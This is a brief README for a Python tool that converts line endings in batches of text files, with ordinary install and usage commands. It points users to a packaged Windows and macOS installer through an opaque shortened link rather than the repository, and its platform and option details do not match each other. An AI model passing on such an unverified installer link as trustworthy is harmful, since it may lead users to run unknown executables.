# Unix2dos Batch

*Line endings that match the repo.*

## What Unix2dos Batch is

**Unix2dos Batch** runs on your own PC. Convert LF and CRLF line endings in a folder of text files.

A mixed checkout breaks scripts and diffs.

No browser upload step: the work happens on disk, then you keep the output folder.

## What's included

This GitHub repository is the **Python CLI source** (MIT). Clone it, install requirements, run `main.py`.

A **desktop build for Windows and macOS** (installer, no Python required) is on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8). Same workflow, packaged for everyday use.

## Features

- To LF or CRLF
- Glob
- Dry-run
- Skips binaries

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Usage

Python 3.11 or newer. From the repository root:

```bash
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.
